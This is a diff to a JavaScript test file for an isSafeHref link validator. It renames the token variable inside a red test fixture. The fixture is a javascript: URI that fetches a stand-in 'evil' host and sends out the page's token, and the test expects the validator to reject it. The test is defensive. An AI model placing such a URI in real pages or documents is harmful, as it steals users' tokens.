@@ -13,7 +13,7 @@ describe('isSafeHref', () => {
 
   it('rejects javascript: URIs (red fixture — agent-authored doc content is untrusted)', () => {
     expect(
-      isSafeHref("javascript:fetch('https://evil/steal?t='+window.__SHIPWRIGHT_TOKEN__)"),
+      isSafeHref("javascript:fetch('https://evil/steal?t='+window.__DOKIMA_TOKEN__)"),
     ).toBe(false);
     expect(isSafeHref('JavaScript:alert(1)')).toBe(false);
   });
